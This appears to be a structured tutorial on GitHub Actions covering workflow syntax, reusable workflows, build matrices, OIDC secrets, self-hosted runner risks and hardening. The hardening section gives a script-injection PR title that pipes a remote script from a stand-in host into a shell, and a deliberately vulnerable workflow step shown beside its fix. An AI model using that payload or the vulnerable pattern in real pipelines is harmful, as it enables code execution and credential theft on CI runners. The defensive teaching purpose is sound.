introduction-automation-where-your-code-.core: GitHub Actions runs automation inside the platform that hosts your code. Any repository event (push, PR, issue, release, schedule) can trigger workflows, with native access to checks, tokens and the marketplace.

first_principles.problem: External CI systems need webhooks, separate credentials and context switching to connect to the repository.
truths: Code events originate in the repo host.
Tight integration reduces glue.
Marketplace actions speed up reuse, and add supply-chain risk.
derivation: **Jobs** run on runners; **steps** run actions or scripts.

analogy.title: Public transit built into the city
analogy.story: Instead of a separate company running buses across town, the city's own transit stops at every building.
analogy.breaks: Being deeply tied to GitHub creates some lock-in.

example.title: Automation beyond CI

steps.label: Effect
steps.detail: One platform handles all repository automation.

example.outcome: automation lives next to the code.

check.q: Where do GitHub Actions workflows live?
check.a: In YAML files under .github/workflows/ in the repository.

workflow-syntax-anatomy.core: A workflow file has `name`, `on` (triggers and filters), optional `permissions`, `env` and `concurrency`, and `jobs`. Each job has `runs-on`, `needs`, `if`, and `steps` that either `uses:` an action or `run:` a shell command.

first_principles.problem: YAML structure errors and misunderstood triggers cause workflows that never run, or run too often.
truths: Triggers decide when work happens.
Jobs run in parallel unless they declare needs.
Expressions `${{ }}` give access to context.
derivation: **on**: push/pull_request with branch and path filters.

analogy.title: A recipe book's structure
analogy.story: Title, when to cook it, the dishes (jobs), the order of the dishes (needs) and the steps inside each.
analogy.breaks: Expressions are evaluated in different contexts, and secrets aren't available in `if` at the job level for forks.

example.title: A complete small workflow

steps.label: Effect
steps.detail: It runs only when src changes, and old runs are cancelled on new pushes.

code.text:
name: ci
on:
  pull_request: { paths: ['src/**'] }
concurrency: { group: ci-${{ github.ref }}, cancel-in-progress: true }
permissions: { contents: read }
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: make test

example.outcome: you can read and write workflows fluently.

check.a: It cancels older running workflows in the same group when a newer one starts.

actions-vs-reusable-workflows.core: Actions package individual steps (JavaScript, Docker or composite). Reusable workflows (`workflow_call`) package entire jobs or pipelines. Use them to centralise standard logic across many repositories.

first_principles.problem: The same deploy logic is copy-pasted into 50 repos, and a security fix has to be applied 50 times.
truths: Duplication spreads bugs.
Steps and whole pipelines have different scopes.
Versioned references allow controlled upgrades.

analogy.title: A cooking technique vs. a complete set menu
analogy.story: An action is a technique ('how to julienne'); a reusable workflow is the whole three-course menu.
analogy.breaks: Nesting depth and secret-passing rules limit reusable workflows.

steps.label: Effect
steps.detail: A fix in v3.1 reaches all 50 repos on their next bump.

code.text:
# caller
jobs:
  deploy:
    uses: acme/platform/.github/workflows/deploy.yml@v3
    with: { service: api, env: prod }
    secrets: inherit

check.q: Which trigger makes a workflow reusable?

matrix-builds-testing-the-multiverse.core: `strategy.matrix` expands one job definition into parallel runs over combinations (OS × language version), with `include` and `exclude` to fine-tune them and `fail-fast` to control cancellation.

first_principles.problem: Testing on 3 Python versions × 2 OSes means 6 near-identical job definitions.
truths: Compatibility must be tested across environments.
Combinations multiply.
Parallel runs save wall-clock time.
derivation: Set **fail-fast: false** to see all failures, and **max-parallel** to cap concurrency.

analogy.title: Taste-testing a recipe in every oven type
analogy.story: One recipe, baked simultaneously in gas, electric and convection ovens at different altitudes.
analogy.breaks: Matrices can explode combinatorially and burn runner minutes, so prune them.

example.title: A Python library matrix

code.text:
strategy:
  fail-fast: false
  matrix:
    os: [ubuntu-latest, macos-latest]
    python: ['3.10', '3.11', '3.12']
    exclude: [ { os: macos-latest, python: '3.10' } ]
runs-on: ${{ matrix.os }}
steps:
  - uses: actions/setup-python@v5
    with: { python-version: '${{ matrix.python }}' }

example.outcome: broad compatibility coverage with no duplication.

check.a: Other matrix jobs keep running when one fails, so you see all failures.

secrets-and-oidc-credential-management-d.core: Prefer OIDC (`id-token: write`) for cloud access over static secrets. Use environment-scoped secrets with protection rules (reviewers, branches), least-privilege GITHUB_TOKEN permissions, and never echo secrets.

first_principles.problem: Long-lived AWS keys in repo secrets are available to every workflow and branch, and they leak in logs.
truths: Static secrets persist and spread.
GitHub can mint OIDC tokens per job.
Environments can gate access.
derivation: Set **permissions: { id-token: write }** and use the cloud's assume-role action.
Set the default **contents: read** for GITHUB_TOKEN.

analogy.title: Temporary visitor passes
analogy.story: Instead of copying a master key for everyone, each visitor gets a timed pass for one area, approved by security.
analogy.breaks: OIDC trust policies must restrict repo, branch and environment, or any workflow can assume the role.

self-hosted-runner-security.core: Self-hosted runners on public repos let anyone's fork PR run code on your infrastructure. Use them only for trusted workflows, make them ephemeral, isolate them in runner groups, and segment their network.

first_principles.problem: A fork PR runs a crypto miner or reads credentials left on a persistent self-hosted runner inside your network.
truths: PR code executes on the runner.
Persistent runners keep state.
Runners often sit inside private networks.
derivation: **Never** use self-hosted runners for public fork PRs.
Use **runner groups** restricted to specific repos and workflows.

analogy.title: Letting strangers use your workshop
analogy.story: If anyone can walk in and use the tools, they can also take the keys hanging on the wall.
analogy.breaks: Even private repos have insider and compromised-account risks, so stay ephemeral.

example.title: An ARC ephemeral runner scale set

steps.label: Effect
steps.detail: Each job starts clean, and nothing persists.

check.q: Why are self-hosted runners dangerous on public repos?
check.a: Anyone can open a PR whose code then runs on your infrastructure.

workflow-security-hardening.core: Harden workflows: pin third-party actions to full commit SHAs, set minimal permissions, avoid script injection from untrusted inputs (titles, branch names), be careful with pull_request_target, and audit with tools like zizmor or OpenSSF Scorecard.

first_principles.problem: A PR titled `"; curl evil.sh | sh #` injects shell code into a step that interpolates github.event.pull_request.title.
truths: Tags on actions can be moved.
`${{ }}` is substituted before the shell parses the line.
The default token permissions may be broad.
derivation: Set **permissions** at workflow or job level.
Pass untrusted input through **env vars**, never inline `${{ }}` in run:.

analogy.title: Food safety in a kitchen
analogy.story: Sealed supplier batches (SHA pins), minimal knife access (permissions), and never taking an ingredient from a stranger without inspecting it (input sanitising).
analogy.breaks: Pinning means you must update deliberately, so automate it.

example.title: Fixing script injection

steps.label: Effect
steps.detail: The title is treated as data, not code.

code.text:
# vulnerable
- run: echo "${{ github.event.pull_request.title }}"
# safe
- env: { TITLE: "${{ github.event.pull_request.title }}" }
  run: echo "$TITLE"

example.outcome: workflows resist supply-chain and injection attacks.

check.q: Why pin actions to a commit SHA instead of a tag?
check.a: Tags can be moved to malicious code, while a SHA is immutable.
